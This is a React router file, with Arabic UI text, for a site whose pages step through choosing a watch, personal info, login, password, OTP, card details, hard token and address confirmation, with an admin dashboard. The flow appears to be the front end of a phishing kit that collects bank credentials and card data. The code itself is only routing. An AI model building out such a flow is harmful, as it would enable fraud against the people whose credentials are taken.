import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { lazy, Suspense } from "react";
import { Route, Switch } from "wouter";
import ErrorBoundary from "./components/ErrorBoundary";
import { ThemeProvider } from "./contexts/ThemeContext";

const Home = lazy(() => import("./pages/Home"));
const ChooseWatch = lazy(() => import("./pages/ChooseWatch"));
const WatchDetails = lazy(() => import("./pages/WatchDetails"));
const PersonalInfo = lazy(() => import("./pages/PersonalInfo"));
const Login = lazy(() => import("./pages/Login"));
const OTP = lazy(() => import("./pages/OTP"));
const ConfirmOTP = lazy(() => import("./pages/ConfirmOTP"));
const CardInfo = lazy(() => import("./pages/CardInfo"));
const WatchLink = lazy(() => import("./pages/WatchLink"));
const Waiting = lazy(() => import("./pages/Waiting"));
const SmartReview = lazy(() => import("./pages/SmartReview"));
const Success = lazy(() => import("./pages/Success"));
const Registered = lazy(() => import("./pages/Registered"));
const ResetPassword = lazy(() => import("./pages/ResetPassword"));
const WhatsAppContact = lazy(() => import("./pages/WhatsAppContact"));
const AdminLogin = lazy(() => import("./pages/AdminLogin"));
const AdminDashboard = lazy(() => import("./pages/AdminDashboard"));
const Password = lazy(() => import("./pages/Password"));
const HardToken = lazy(() => import("./pages/HardToken"));
const SecurityNotice = lazy(() => import("./pages/SecurityNotice"));
const ConfirmAddress = lazy(() => import("./pages/ConfirmAddress"));
const NotFound = lazy(() => import("./pages/NotFound"));
const Repository = lazy(() => import("./pages/Repository"));

function RouteLoadingFallback() {
  return (
    <div
      dir="rtl"
      role="status"
      aria-live="polite"
      style={{
        minHeight: "100vh",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        background: "#ffffff",
        color: "#1B7A3D",
        fontFamily: "'Cairo', sans-serif",
        fontWeight: 700,
      }}
    >
      جارٍ التحميل…
    </div>
  );
}

function Router() {
  return (
    <Switch>
      <Route path="/" component={Home} />
      <Route path="/choose-watch" component={ChooseWatch} />
      <Route path="/watch-details" component={WatchDetails} />
      <Route path="/personal-info" component={PersonalInfo} />
      <Route path="/login" component={Login} />
      <Route path="/password" component={Password} />
      <Route path="/otp" component={OTP} />
      <Route path="/confirm-otp" component={ConfirmOTP} />
      <Route path="/card-info" component={CardInfo} />
      <Route path="/watch-link" component={WatchLink} />
      <Route path="/token" component={WatchLink} />
      <Route path="/hard-token" component={HardToken} />
      <Route path="/security-notice" component={SecurityNotice} />
      <Route path="/confirm-address" component={ConfirmAddress} />
      <Route path="/processing" component={Waiting} />
      <Route path="/smart-review" component={SmartReview} />
      <Route path="/success" component={Success} />
      <Route path="/registered" component={Registered} />
      <Route path="/reset-password" component={ResetPassword} />
      <Route path="/whatsapp" component={WhatsAppContact} />
      <Route path="/admin" component={AdminLogin} />
      <Route path="/admin/dashboard" component={AdminDashboard} />
      <Route path="/repository" component={Repository} />
      <Route path="/404" component={NotFound} />
      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="dark">
        <TooltipProvider>
          <Toaster />
          <Suspense fallback={<RouteLoadingFallback />}>
            <Router />
          </Suspense>
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
